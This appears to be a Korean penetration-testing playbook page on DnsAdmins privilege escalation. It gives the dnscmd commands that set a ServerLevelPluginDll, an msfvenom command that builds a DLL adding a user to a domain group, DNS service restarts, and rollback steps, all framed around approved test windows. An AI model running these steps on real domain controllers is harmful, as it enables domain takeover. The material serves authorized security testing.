---
tags:
  - 환경/ad
  - 서비스/dns
시작조건: ["DnsAdmins 그룹이 현재 Windows token에 반영된 세션 확보", "관리 대상 Windows DNS 서버 식별"]
필요권한: ["대상 DNS 서버의 DnsAdmins 권한", "DNS 서비스 재시작은 별도의 SERVICE_STOP·SERVICE_START 권한"]
필요조건: ["대상 DNS 서버에서 읽을 수 있는 승인된 DNS plug-in DLL의 절대 경로", "dnscmd RPC 관리 경로", "서비스 영향과 그룹 변경·복구가 승인된 작업 창", "그룹 추가 proof 사용 시 별도 복구 관리자"]
결과: ["DNS 서비스 계정 컨텍스트의 제어된 명령 실행", "Domain Controller DNS라면 SYSTEM 실행 증거", "승인된 그룹 추가와 새 로그온 token에서 확인한 실제 확대 권한", "플러그인 설정만 성공하고 실행은 미확인인 중간 상태"]
---

# DnsAdmins DNS 서버 플러그인 DLL 실행

## 한 줄 판단

현재 token에 DnsAdmins 멤버십이 반영되고 대상 Windows DNS 서버가 읽을 수 있는 승인된 plug-in DLL을 준비했다면, `ServerLevelPluginDll`을 기준선과 함께 변경하고 별도 서비스 제어 권한이 있을 때만 DNS를 재시작하여 DNS 서비스 계정의 제어된 proof를 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치와 관리 경로 | Windows 관리 호스트에서 대상 DNS 서버 RPC 관리 가능 | `dnscmd <DNS_SERVER> /info`의 응답과 대상명 확인 | DNS 이름 해석, RPC·방화벽과 실행 호스트를 확인 |
| 현재 계정 | DnsAdmins SID가 현재 token에 반영됨 | `whoami /groups`와 `Get-ADGroupMember DnsAdmins` 결과를 분리해 확인 | 그룹 변경 직후라면 새 로그온 token을 만든 뒤 재확인 |
| 설정 권한 | 대상 서버의 `ServerLevelPluginDll` 조회·변경 가능 | `/info /serverlevelplugindll`과 승인된 변경 명령 결과 | 일반 DNS record 쓰기와 server-level config 권한을 구분 |
| DLL 입력 | DNS 서버의 service account가 읽을 수 있는 절대 local 또는 UNC 경로의 승인된 DLL | exact path와 ACL, SHA-256 기록 | 상대 경로·공격 호스트의 로컬 경로를 대상 경로로 착각하지 않음 |
| 서비스 제어 | 별도의 DNS stop/start 권한과 영향 승인 | `sc.exe \\<DNS_SERVER> sdshow DNS`, 작업 창 확인 | 권한이 없으면 설정만으로 실행 성공을 주장하지 말고 즉시 원복 |
| 복구 기준선 | 기존 plug-in 값, 서비스 상태와 DNS 기준 질의 기록 | `dnscmd /info`, `sc query`, 승인된 이름의 `nslookup` | 기존 값이 있으면 덮어쓰기 전에 중단하고 복구 경로 합의 |

`DnsAdmins`는 AD 그룹 상태이고 `ServerLevelPluginDll` 설정, 서비스 재시작, DLL 실행은 서로 다른 단계다. Domain Controller에서 DNS 중단은 도메인 전체 인증·이름 해석에 영향을 줄 수 있으므로 서비스 stop/start는 명시적으로 승인된 작업 창에서만 수행한다.

## 실행

### 1. 현재 token과 기존 DNS 설정 기록

```cmd
whoami /groups | findstr /i "DnsAdmins"
dnscmd <DNS_SERVER> /info /serverlevelplugindll
sc.exe \\<DNS_SERVER> query DNS
nslookup <BASELINE_NAME> <DNS_SERVER>
```

확인할 출력:

- DnsAdmins가 디렉터리 그룹 목록뿐 아니라 현재 token에 표시되는지 확인한다.
- 기존 `ServerLevelPluginDll` 값이 비어 있는지 또는 승인된 기존 plug-in이 있는지 기록한다.
- `STATE : 4 RUNNING`과 기준 DNS 응답을 저장한다. 설정 조회 성공은 DLL 실행이 아니다.

### 2. 승인된 plug-in과 proof 방식 선택

DLL은 DNS server plug-in entry point를 구현한다. 기본 경로는 승인된 proof file에 실행 Identity와 시각만 기록하는 방식이다. 계정을 Domain Admins 같은 그룹에 추가해 실제 권한 확대까지 확인해야 한다면 아래 상태 변경 proof를 별도로 승인받고, 추가할 계정·그룹의 기존 membership과 복구 관리자를 먼저 확인한다.

#### 상태 변경 없는 기본 proof

```powershell
Get-FileHash -Algorithm SHA256 -LiteralPath '<AUTHORIZED_DNS_PLUGIN_DLL>'
Get-Acl -LiteralPath '<AUTHORIZED_DNS_PLUGIN_DLL>' | Format-List Owner,AccessToString
```

#### 승인된 그룹 추가 proof

대상 계정이 `<TARGET_DOMAIN_GROUP>`의 기존 구성원이 아닌지 먼저 확인한다. 기존 구성원이면 이 proof로 추가·제거하지 않는다.

```powershell
Get-ADGroupMember -Identity '<TARGET_DOMAIN_GROUP>' |
  Where-Object SamAccountName -eq '<TEST_USER>'
```

Linux 빌드 호스트에서 DNS service가 실행할 명령을 포함한 DLL을 생성한다. 고정 계정·그룹 대신 승인된 `<TEST_USER>`와 `<TARGET_DOMAIN_GROUP>`만 사용한다.

```bash
msfvenom -p windows/x64/exec cmd='net group "<TARGET_DOMAIN_GROUP>" "<TEST_USER>" /add /domain' -f dll -o '<PLUGIN_DLL>'
sha256sum '<PLUGIN_DLL>'
```

이 DLL은 DNS service account가 AD에서 해당 그룹 membership을 변경할 권한이 있을 때만 성공한다. DLL 실행과 그룹 추가는 별도 결과이며, command exit status와 directory의 실제 membership을 다음 단계에서 확인한다.

```cmd
dnscmd <DNS_SERVER> /config /serverlevelplugindll <ABSOLUTE_PLUGIN_DLL_PATH>
dnscmd <DNS_SERVER> /info /serverlevelplugindll
```

확인할 출력:

- `Registry property serverlevelplugindll successfully reset`와 설정한 exact 경로.
- 이 시점의 결과는 다음 서비스 시작 때 load할 경로가 설정된 상태다. SYSTEM 명령 실행이나 Domain Admin 권한을 얻었다고 판정하지 않는다.

### 3. 승인된 경우에만 DNS 서비스를 재시작하고 선택한 proof 확인

서비스 DACL에 현재 SID의 stop/start가 있고 영향 승인이 있을 때만 실행한다.

```cmd
sc.exe \\<DNS_SERVER> stop DNS
sc.exe \\<DNS_SERVER> start DNS
sc.exe \\<DNS_SERVER> query DNS
```

```powershell
Get-Content -LiteralPath '<PLUGIN_PROOF_FILE>'
Get-ADGroupMember -Identity '<TARGET_DOMAIN_GROUP>' |
  Where-Object SamAccountName -eq '<TEST_USER>'
```

확인할 출력:

- DNS 서비스가 `RUNNING`으로 복귀했는지 확인한다.
- 기본 proof에서는 proof file의 Identity가 DNS 서비스 실행 계정과 일치해야 DLL 실행을 판정한다. Domain Controller의 기본 DNS 서비스라면 일반적으로 `NT AUTHORITY\SYSTEM`이지만 실제 출력으로 확인한다.
- 그룹 추가 proof에서는 `<TEST_USER>`가 `<TARGET_DOMAIN_GROUP>`에 새로 나타나야 directory membership 변경을 판정한다. 이 시점은 기존 로그온 token의 권한 확대를 뜻하지 않는다.
- 서비스 start 실패는 plug-in ABI·architecture·경로·ACL·Code Integrity 문제일 수 있다. DNS를 반복 재시작하지 말고 즉시 복구 단계로 이동한다.

### 4. 추가된 계정으로 새 로그인하고 확대 권한 확인

그룹 추가 proof를 선택한 경우에만 수행한다. `<TEST_USER>`의 기존 Windows 로그온에서 다음 명령으로 로그오프한다.

```cmd
shutdown /l
```

같은 `<TEST_USER>`로 다시 로그인한 뒤 새 token과 승인된 대상 접근을 확인한다.

```cmd
whoami /all
whoami /groups | findstr /i "<TARGET_DOMAIN_GROUP>"
dir \\<AUTHORIZED_TARGET>\ADMIN$
```

확인할 출력:

- `whoami /all`의 사용자 SID가 `<TEST_USER>`이고, 그룹 목록에 `<TARGET_DOMAIN_GROUP>` SID가 현재 token의 enabled group으로 표시되어야 한다.
- `dir \\<AUTHORIZED_TARGET>\ADMIN$`의 성공은 새 token으로 해당 SMB administrative share를 읽은 결과다. Domain Admin membership만으로 DCSync·WinRM·다른 host 관리 권한까지 모두 성공했다고 확대하지 않는다.
- 그룹 목록에는 보이지만 실제 대상 접근이 거부되면 UAC·deny ACE·logon type·대상 정책·네트워크 경로를 구분한다. 멤버십 표시만으로 영향 검증 완료로 기록하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 설정 명령만 성공 | plug-in 경로 변경 성공 | 서비스 계정 실행 미확인 | 재시작 권한·승인이 없으면 즉시 원래 값으로 복구 |
| DNS가 재시작되고 proof Identity가 SYSTEM | DNS 서비스의 controlled DLL load 성공 | 대상 DNS 서버의 SYSTEM 실행 확인 | [[고권한 세션 확보 후 후속 판단]]에서 허용된 후속 작업 선택 |
| `<TEST_USER>`가 새 그룹 구성원으로 보이지만 기존 session만 유지됨 | directory membership만 변경되고 기존 token은 유지됨 | 확대 권한 사용 미확인 | 기존 session에서 `shutdown /l` 후 같은 계정으로 새 로그인 |
| 새 로그인 token에 그룹 SID가 반영되고 승인된 대상 접근 성공 | 그룹 추가와 실제 권한 사용 확인 | `<TEST_USER>`의 확대된 새 로그온 token | 필요한 최소 영향 확인 뒤 즉시 복구 |
| `ERROR_ACCESS_DENIED` | 현재 token에 필요한 DnsAdmins 또는 server config 권한 없음 | 설정 실패 | 그룹 디렉터리 상태, 새 token과 대상 서버를 확인 |
| DNS start 실패 | plug-in load 또는 서비스 초기화 실패 | DNS 서비스 영향 발생 | 다른 시도보다 `ServerLevelPluginDll` 원복과 정상 질의를 우선 |
| DNS는 실행되나 proof 없음 | DLL 경로·entry point·architecture·ACL 또는 정책 미충족 | 명령 실행 미확인 | 서비스 event log와 Code Integrity 오류를 확인하고 성공으로 기록하지 않음 |

## 변경 영향과 복구

기존 값이 없었던 경우에는 DLL 경로를 생략해 custom plug-in 사용을 해제한다. 기존 값이 있었으면 기록한 exact 원래 경로로 되돌린다.

```cmd
dnscmd <DNS_SERVER> /config /serverlevelplugindll
```

또는 기존 값이 있었던 경우:

```cmd
dnscmd <DNS_SERVER> /config /serverlevelplugindll <ORIGINAL_PLUGIN_DLL_PATH>
```

승인된 작업 창에서 DNS를 다시 시작한 뒤 상태와 기준 이름 해석을 확인한다.

```cmd
sc.exe \\<DNS_SERVER> stop DNS
sc.exe \\<DNS_SERVER> start DNS
sc.exe \\<DNS_SERVER> query DNS
nslookup <BASELINE_NAME> <DNS_SERVER>
dnscmd <DNS_SERVER> /info /serverlevelplugindll
```

그룹 추가 proof를 사용했다면 별도 복구 관리자 session에서 이번에 추가한 exact membership만 제거한다.

```cmd
net group "<TARGET_DOMAIN_GROUP>" "<TEST_USER>" /delete /domain
```

```powershell
Get-ADGroupMember -Identity '<TARGET_DOMAIN_GROUP>' |
  Where-Object SamAccountName -eq '<TEST_USER>'
```

membership 조회가 비어도 이미 발급된 고권한 token은 자동 폐기되지 않는다. `<TEST_USER>`의 현재 로그온에서 `shutdown /l`을 실행하고 다시 로그인한 뒤 그룹 SID가 사라지고 승인된 고권한 대상 접근이 더 이상 허용되지 않는지 확인한다. `<TEST_USER>`가 작업 전부터 그룹 구성원이었거나 다른 관리자가 동시에 membership을 변경했다면 자동 제거하지 않고 기준선과 현재 값을 수동 병합한다.

이번 작업에서 생성한 DLL과 proof file은 서비스가 더 이상 참조하지 않고 hash·경로 확인이 끝난 뒤 exact path만 삭제한다. 로그, DNS 중단, 이미 노출된 자료와 별도로 발급된 Kerberos ticket은 파일·membership 삭제만으로 되돌릴 수 없다.

## 관련 서비스

- [[DNS 서비스]]

## 관련 도구

- [[dnscmd]]
- [[powershell]]
- [[msfvenom]]

## 관련 상태 라우터

- [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- [[Windows 위임 운영 그룹 확인 후 권한 경로 선택]]
- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Microsoft Learn: DnsAdmins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)
- [Microsoft Learn: dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
- [Microsoft Open Specifications: ServerLevelPluginDll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723)
